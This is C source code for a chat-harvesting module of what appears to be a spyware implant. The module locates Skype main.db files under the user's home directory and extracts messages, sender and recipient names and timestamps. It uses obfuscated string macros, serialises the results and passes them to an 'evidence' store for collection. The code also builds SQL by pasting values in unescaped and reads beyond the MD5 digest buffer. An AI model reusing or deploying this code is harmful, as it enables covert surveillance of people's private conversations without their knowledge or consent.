#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <openssl/bio.h>
#include <openssl/md5.h>
#include <sqlite3.h>
#include <linux/limits.h>
#include <glob.h>

#include "module.h"
#include "bioutils.h"
#include "evidencemanager.h"
#include "me.h"
#include "so.h"
#include "runtime.h"

#define ENTRY_OUTGOING 0x00000000
#define ENTRY_INCOMING 0x00000001

#define PROGRAM_SKYPE 0x01

static int skype_getchat(void);
static int skype_getentries(char *maindb);
static int skype_sqlcallback1(void *arg, int num, char **val, char **key);
static int skype_sqlcallback2(void *arg, int num, char **val, char **key);

struct entry {
   time_t timestamp;
   int program;
   int type;
   char *from;
   char *fromname;
   char *to;
   char *toname;
   char *text;
   struct entry *next;
};

static struct entry *list = NULL, *listp = NULL;

static sqlite3 *skype_db;

void *module_chat_main(void *args)
{
   BIO *bio_data = NULL;
   char *dataptr = 0;
   long datalen = 0;
   int i;
   struct tm t;
   fd_set rfds;
   struct timeval tv;

   debugme("Module CHAT started\n");

   do {
      if(!(bio_data = BIO_new(BIO_s_mem()))) break;

      while(MODULE_CHAT.status != MODULE_STOPPING) {
         skype_getchat();

         if(list) {
            for(listp = list; listp; listp = listp->next) {
               debugme("- CHAT %s %s %s %s %s\n", listp->from, listp->fromname, listp->to, listp->toname, listp->text);
               memset(&t, 0, sizeof(t));
               if(listp->timestamp) if(gmtime_r(&listp->timestamp, &t)) {
                  t.tm_mon++;
                  t.tm_year += 1900;
               }
               BIO_write(bio_data, &t.tm_sec, 4);
               BIO_write(bio_data, &t.tm_min, 4);
               BIO_write(bio_data, &t.tm_hour, 4);
               BIO_write(bio_data, &t.tm_mday, 4);
               BIO_write(bio_data, &t.tm_mon, 4);
               BIO_write(bio_data, &t.tm_year, 4);
               BIO_write(bio_data, &t.tm_wday, 4);
               BIO_write(bio_data, &t.tm_yday, 4);
               BIO_write(bio_data, &t.tm_isdst, 4);
               BIO_write(bio_data, &listp->program, sizeof(listp->program));
               BIO_write(bio_data, &listp->type, sizeof(listp->type));
               if(listp->from) BIO_puts16(bio_data, listp->from);
               BIO_write(bio_data, "\x00\x00", 2);
               if(listp->fromname) BIO_puts16(bio_data, listp->fromname);
               BIO_write(bio_data, "\x00\x00", 2);
               if(listp->to) BIO_puts16(bio_data, listp->to);
               BIO_write(bio_data, "\x00\x00", 2);
               if(listp->toname) BIO_puts16(bio_data, listp->toname);
               BIO_write(bio_data, "\x00\x00", 2);
               if(listp->text) BIO_puts16(bio_data, listp->text);
               BIO_write(bio_data, "\x00\x00", 2);
               BIO_write(bio_data, "\xDE\xC0\xAD\xAB", 4);
            }

            if((datalen = BIO_get_mem_data(bio_data, &dataptr))) evidence_write(EVIDENCE_TYPE_CHAT, NULL, 0, dataptr, datalen);

            BIO_reset(bio_data);

            for(listp = list; listp;) {
               list = listp;
               listp = listp->next;
               if(list->from) free(list->from);
               if(list->fromname) free(list->fromname);
               if(list->to) free(list->to);
               if(list->toname) free(list->toname);
               if(list->text) free(list->text);
               free(list);
            }
            list = NULL;
         }

         FD_ZERO(&rfds);
         FD_SET(MODULE_CHAT.event, &rfds);
         tv.tv_sec = 300;
         tv.tv_usec = 0;
         select(MODULE_CHAT.event + 1, &rfds, NULL, NULL, &tv);
      }
   } while(0);
   if(bio_data) BIO_free(bio_data);

   debugme("Module CHAT stopped\n");

   return NULL;
}

static int skype_getchat(void)
{
   char file[PATH_MAX];
   glob_t maindb = {0};
   int i;

   do {
      if(initlib(INIT_LIBSQLITE3)) break;
      if(snprintf(file, sizeof(file), SO"%s/.Skype/*/main.db", getenv(SO"HOME")) >= sizeof(file)) break;
      if(glob(file, GLOB_NOSORT, NULL, &maindb)) break;
      for(i = 0; i < maindb.gl_pathc; i++) skype_getentries(maindb.gl_pathv[i]);
   } while(0);
   globfree(&maindb);

   return 0;
}

static int skype_getentries(char *maindb)
{
   FILE *fp = NULL;
   char line[4096];
   unsigned char md5[MD5_DIGEST_LENGTH];
   char statusfile[2 + (MD5_DIGEST_LENGTH * 2) + 1];
   char query[512];
   int timestamp = 0;

   do {
      debugme("CHAT Database: %s\n", maindb);

      MD5((unsigned char *)maindb, strlen(maindb), md5);

      snprintf(statusfile, sizeof(statusfile), SO"CC%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
                                                  md5[0], md5[1], md5[2], md5[3], md5[4], md5[5], md5[6], md5[7], md5[8], md5[9],
                                                  md5[10], md5[11], md5[12], md5[13], md5[14], md5[15], md5[16], md5[17], md5[18], md5[19]);

      do {
         if(!(fp = fopen(statusfile, "r"))) break;
         if(!fgets(line, sizeof(line), fp)) break;
         timestamp = atoi(line);
      } while(0);
      if(fp) fclose(fp);

      if(sqlite3_open(maindb, &skype_db) != SQLITE_OK) break;
      if(snprintf(query, sizeof(query), SO"SELECT chatname, timestamp, author, IFNULL(C.displayname, A.fullname), body_xml, IFNULL(A.fullname, NULL) FROM Messages AS M LEFT JOIN Contacts AS C ON author = C.skypename LEFT JOIN Accounts AS A ON author = A.skypename WHERE M.type = 61 AND (timestamp > %u OR edited_timestamp > %u) ORDER BY timestamp", timestamp, timestamp) >= sizeof(query)) break;
      if(sqlite3_exec(skype_db, query, skype_sqlcallback1, (void *)&timestamp, NULL) != SQLITE_OK) break;
   } while(0);
   if(skype_db) {
      sqlite3_close(skype_db);
      skype_db = NULL;
   }

   do {
      if(!(fp = fopen(statusfile, "w"))) break;
      fprintf(fp, "%u\n", timestamp);
   } while(0);
   if(fp) fclose(fp);

   return 0;
}

static int skype_sqlcallback1(void *arg, int num, char **val, char **key)
{
   char query[512];

   do {
      *((int *)arg) = atoi(val[1]);

      if(!list) {
         if(!(list = malloc(sizeof(struct entry)))) break;
         listp = list;
      } else {
         if(!(listp->next = malloc(sizeof(struct entry)))) break;
         listp = listp->next;
      }
      memset(listp, 0, sizeof(struct entry));

      listp->timestamp = atoi(val[1]);
      listp->program = PROGRAM_SKYPE;
      listp->type = (val[5] ? ENTRY_OUTGOING : ENTRY_INCOMING);

      if(val[2]) listp->from = strdup(val[2]);
      if(val[3]) listp->fromname = strdup(val[3]);
      if(val[4]) listp->text = strdup(val[4]);

      if(snprintf(query, sizeof(query), SO"SELECT identity, IFNULL(C.displayname, A.fullname) FROM ChatMembers LEFT JOIN Contacts AS C ON identity = C.skypename LEFT JOIN Accounts AS A on identity = A.skypename WHERE chatname = '%s' AND NOT identity = '%s'", val[0], val[2]) >= sizeof(query)) break;
      if(sqlite3_exec(skype_db, query, skype_sqlcallback2, (void *)listp, NULL) != SQLITE_OK) break;
   } while(0);

   return 0;
}

static int skype_sqlcallback2(void *arg, int num, char **val, char **key)
{
   struct entry *e = arg;
   char *buf = NULL;

   if(!e->to) {
      e->to = strdup(val[0]);
   } else {
      asprintf(&buf, "%s,%s", e->to, val[0]);
      free(e->to);
      e->to = buf;
      buf = NULL;
   }

   if(!e->toname) {
      e->toname = strdup(val[1]);
   } else {
      asprintf(&buf, "%s, %s", e->toname, val[1]);
      free(e->toname);
      e->toname = buf;
      buf = NULL;
   }

   return 0;
}
